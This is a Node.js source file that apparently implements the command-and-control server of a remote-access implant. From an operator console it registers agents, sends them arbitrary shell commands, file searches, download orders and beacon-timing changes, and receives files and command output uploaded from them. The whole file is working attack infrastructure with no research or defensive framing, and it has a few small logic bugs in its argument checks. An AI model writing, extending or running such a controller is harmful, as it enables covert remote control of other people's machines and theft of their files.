const readline = require('readline');
const express = require('express');
const bodyParser = require('body-parser');
const fileUpload = require('express-fileupload');
const process = require('process');
const events = require('events');
const fs = require('fs');
const crypto = require('crypto');

// local imports
const Agent = require('./agent');

const app = express();

const PORT = 3000;
const CLIENTS_DIRECTORY = 'clients';
const CLIENT_TIMEOUT = 20 * 1000; // timeout of 20 seconds

const agents = {}; // connected agents

// ---------- helper functions ---------- //

function success(info) {
  console.log('\x1b[32m%s\x1b[0m', info);
}

function error(info) {
  console.log('\x1b[31m%s\x1b[0m', info);
}

// ---------- initialize prompt ---------- //

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
  /*completer: line => {
    const command = line.trim().split(' ');

    let completions = [];
    let commands = 'agent exit'.split(' ');
    let agentCommands = 'list cmd disconnect find time download'.split(' ');

    if (line == '') {
      completions = commands;
    } else if (line == 'agent') {
      completions = agentCommands;
    } else if (agentCommands.includes(line)) {
      completions = Object.keys(agents);
      console.log(completions);
    }

    const hits = completions.filter((c) => c.startsWith(line));
    
    return [hits.length ? hits : completions, line];
  },*/
});

rl.setPrompt('> ');
rl.on('line', line => {
  // split line into command and arguments, filtering out empty strings
  let [cmd, ...args] = line.split(' ').filter(l => l.length != 0);

  switch (cmd) {
    case 'agent':
      let id = args[1];

      switch(args[0]) {
        case 'list':
          listAgents();
          break;

        case 'cmd':
          const command = args.slice(2);
          if (id == undefined || cmd.length == 0) {
            console.log('Usage: agent cmd <ID> <command>');
          } else if (id in agents) {
            sendCommand(id, command.join(' '));
          } else {
            error('An agent with that ID does not exist');
          }
          break;

        case 'disconnect':
          if (id == undefined) {
            console.log('Usage: agent disconnect <ID>');
          } else if (id in agents) {
            disconnect(id);
          } else {
            error('An agent with that ID does not exist');
          }
          break;

        case 'find':
          const fileNames = args.slice(2);
          if (id == undefined || fileNames.length == 0) {
            console.log('Usage: agent find <ID> <command>');
          } else if (id in agents) {
            find(id, fileNames.join(' '));
          } else {
            error('An agent with that ID does not exist');
          }
          break;

        case 'time':
          const seconds = args[2];
          if (id == undefined || seconds == undefined) {
            console.log('Usage: agent find <ID> <command>');
          } else if (id in agents) {
            setTime(id, seconds);
          } else {
            error('An agent with that ID does not exist');
          }
          break;

        case 'download':
          const url = args.slice(2);
          if (id == undefined || download == undefined) {
            console.log('Usage: agent download <ID> <url>');
          } else if (id in agents) {
            download(id, url);
          } else {
            error('An agent with that ID does not exist');
          }
          break;

        default:
          console.log('Usage: agent list\n' +
                      '       agent cmd <ID> <command>\n' +
                      '       agent disconnect <ID>\n' +
                      '       agent find <ID> <command>\n' +
                      '       agent time <ID> <seconds>\n' +
                      '       agent download <ID> <url>\n');
      }
      break;

    case 'exit':
      console.log('Shutting down server');
      process.exit();
  }
      
  rl.prompt();
});

// ---------- server commands ---------- //

function listAgents() {
  console.log('Connected agents:');
  for (let id in agents) {
    console.log(`Agent ${id}: ${JSON.stringify(agents[id])}`)
  }
}

function sendCommand(id, command) {
  console.log(`Executing ${command} on agent ${id}`);
  agents[id].queueCommand(`command&${command}`);
}

function disconnect(id) {
  console.log(`Issuing disconnect on agent ${id}`);
  agents[id].queueCommand(`disconnect&`);
}

function find(id, fileNames) {
  console.log(`Executing find of ${fileNames} on agent ${id}`);
  agents[id].queueCommand(`find&find ${fileNames}`);
}

function setTime(id, seconds) {
  console.log(`Chainging wait time to ${seconds} on agent ${id}`);
  agents[id].commands.push(`time&${seconds}`);
}

function download(id, url) {
  console.log(`Told agent ${id} to download file with url ${url}`);
  agents[id].queueCommand(`download&${url}`);
}

// ---------- express endpoints ---------- //

// support parsing of application/json POST data
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(fileUpload());

app.post('/connect', (req, res) => {
  const agent = new Agent(req.body);
  const agentJson = JSON.stringify(agent);

  success(`New agent ${agentJson}`);

  if (!fs.existsSync(CLIENTS_DIRECTORY)) {
    fs.mkdirSync(CLIENTS_DIRECTORY);
  }

  if (!fs.existsSync(`${CLIENTS_DIRECTORY}/${agent.id}`)) {
    fs.mkdirSync(`${CLIENTS_DIRECTORY}/${agent.id}`);
  }

  fs.writeFile(`${CLIENTS_DIRECTORY}/${agent.id}/client_info.json`, agentJson, err => {
    if (err) {
      error("Error saving the file!");
    }
  });

  agents[agent.id] = agent;

  //res.json({ id: agent.id });
  res.end(agent.id);
});

app.post('/disconnect', (req, res) => {
  const { id } = req.body;
  success(`Agent ${id} has disconnected`);
  delete agents[id];
  res.end();
});

app.post('/command', (req, res) => {
  const { id } = req.body;
  let agent = agents[id];

  if (agent == undefined) {
    const client_info = `${CLIENTS_DIRECTORY}/${id}/client_info.json`;
    if (fs.existsSync(client_info)) {
      agent = new Agent(JSON.parse(fs.readFileSync(client_info)));
      agents[id] = agent;
      success(`Agent ${agent.id} successfully reconnected`);
    } else {
      error('Agent attempting reconnect not found!');
      return;
    }
  }

  agent.lastContacted = new Date();
  res.end(agent.getCommand());
});

app.post('/upload', (req, res) => {
  const { file } = req.files;
  const { id } = req.body;

  success(`Received file from ${id}`);

  file.mv(`${CLIENTS_DIRECTORY}/${id}/${file.name}`, err => {
    if (err) {
      return res.status(500).send(err);
    }

    res.send('File uploaded!');
  });
});

app.post('/output', (req, res) => {
  const { output } = req.body;
  success(output);
  res.end();
});

// start server
app.listen(PORT, () => {
  console.log(`Started on port ${PORT}`);
  rl.prompt();
});

// check every so often that agents are still connected
setInterval(() => {
  for (let id in agents) {
    if (((new Date()) - agents[id].lastContacted) > CLIENT_TIMEOUT) {
      error(`Agent ${id} has timed out`);
      delete agents[id];
    }
  }
}, CLIENT_TIMEOUT);
